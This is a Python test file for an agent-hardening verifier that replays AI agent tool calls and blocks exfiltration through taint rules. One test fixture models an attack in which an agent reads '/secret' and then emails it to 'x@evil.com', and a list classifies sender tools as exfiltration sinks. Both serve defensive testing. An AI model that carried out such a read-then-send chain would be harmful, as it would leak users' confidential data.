"""Tests for exfiltration-sink semantics in the verifier.

Regression guard for two fixes:
  1. A pure reader annotated write=low must NOT be treated as a low-write sink
     (it would self-block on its own read, destroying utility).
  2. The IFC-001 exfil block must test taint from PRIOR reads, and a genuine
     read -> external-send chain must still be blocked.
"""

from __future__ import annotations

from agent_hardener.shared.schemas import (
    CapabilityAnnotations,
    ConfidentialityAnnotations,
    ConfidentialityLevel,
    DeploymentSpec,
    GatewayEnforcementSpec,
    PolicyCoverage,
    RedAgentFeedbackSchema,
    SAMOSPolicy,
    SessionTaintRules,
    TaintLevel,
    ToolAnnotation,
    ToolCall,
)
from agent_hardener.verifier.replay import (
    VerifierVerdictStatus,
    _looks_like_exfil_sink,
    replay_trajectory,
)


def _reader_policy(initial_taint=TaintLevel.HIGH) -> SAMOSPolicy:
    # read_file: reads high, "writes" low (common mislabel), NO network. Initial
    # taint HIGH to reproduce the worst case that used to self-block.
    return SAMOSPolicy(
        tool_name="read_file",
        generated_from_attack_cycles=1,
        confidentiality_annotations=ConfidentialityAnnotations(
            read_confidentiality=ConfidentialityLevel.HIGH,
            write_confidentiality=ConfidentialityLevel.LOW,
            read_justification="", write_justification=""),
        capability_annotations=CapabilityAnnotations(filesystem=True, network=False),
        session_taint_rules=SessionTaintRules(initial_session_taint=initial_taint),
        enforcement_rules=[],
        gateway_enforcement=GatewayEnforcementSpec(
            tool_annotation=ToolAnnotation(
                name="read_file",
                read_confidentiality=ConfidentialityLevel.HIGH,
                write_confidentiality=ConfidentialityLevel.LOW,
                network=False),
            session_initial_taint=initial_taint,
            taint_is_monotonic=True, fail_secure_unknown_tools=True,
            policy_log_required=True, red_agent_feedback_schema=RedAgentFeedbackSchema()),
        deployment_spec=DeploymentSpec(isolation_level="separate_container"),
        policy_coverage=PolicyCoverage(),
    )


class TestSinkClassification:
    def test_readers_are_not_sinks(self):
        for name in ["read_file", "get_config", "list_directory", "load_data"]:
            assert _looks_like_exfil_sink(name) is False, name

    def test_senders_are_sinks(self):
        for name in ["send_email", "post_message", "upload_file", "http_request", "publish_report"]:
            assert _looks_like_exfil_sink(name) is True, name


class TestReaderDoesNotSelfBlock:
    def test_single_read_allowed_even_with_high_initial_taint(self):
        policy = _reader_policy(initial_taint=TaintLevel.HIGH)
        v = replay_trajectory(
            record_id="benign",
            tool_calls=[ToolCall(tool_name="read_file", parameters={"path": "/workspace/x"}, success=True)],
            policy=policy,
        )
        assert v.final_status != VerifierVerdictStatus.BLOCKED

    def test_two_reads_allowed(self):
        policy = _reader_policy(initial_taint=TaintLevel.LOW)
        v = replay_trajectory(
            record_id="benign2",
            tool_calls=[
                ToolCall(tool_name="read_file", parameters={"path": "/a"}, success=True),
                ToolCall(tool_name="read_file", parameters={"path": "/b"}, success=True),
            ],
            policy=policy,
        )
        assert v.final_status != VerifierVerdictStatus.BLOCKED


class TestExfilChainStillBlocked:
    def test_read_then_send_is_blocked(self):
        # Enable network so send_email passes the capability gate and we isolate
        # the taint (IFC-001) path.
        policy = _reader_policy(initial_taint=TaintLevel.LOW)
        policy.capability_annotations.network = True
        v = replay_trajectory(
            record_id="exfil",
            tool_calls=[
                ToolCall(tool_name="read_file", parameters={"path": "/secret"}, success=True),
                ToolCall(tool_name="send_email", parameters={"to": "x@evil.com"}, success=True),
            ],
            policy=policy,
        )
        assert v.final_status == VerifierVerdictStatus.BLOCKED
        assert v.first_blocking_step == 1  # blocked at the send, not the read
        assert "IFC-001-HIGH-TO-LOW" in v.triggered_rule_ids
